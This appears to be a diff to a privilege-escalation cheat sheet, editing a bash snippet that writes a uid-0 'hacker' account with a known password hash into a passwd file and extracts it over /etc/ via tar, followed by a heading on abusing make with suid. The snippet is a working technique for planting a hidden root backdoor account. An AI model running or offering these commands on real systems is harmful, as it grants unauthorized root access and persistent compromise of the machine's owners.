@@ -5,7 +5,8 @@
 
 ```bash
 #hacker:myhackerpass
-echo hacker:$(( echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> passwd
+# hacker:$1$mysalt$7DTZJIc9s6z60L6aj0Sui.:0:0:hacker:/root:/bin/bash >> passwd
+echo hacker:$(( echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0:hacker:/root:/bin/bash >> passwd
 tar -cvf passwd.tar passwd
 tar -xvf passwd.tar -C /etc/
 # Using make with suid
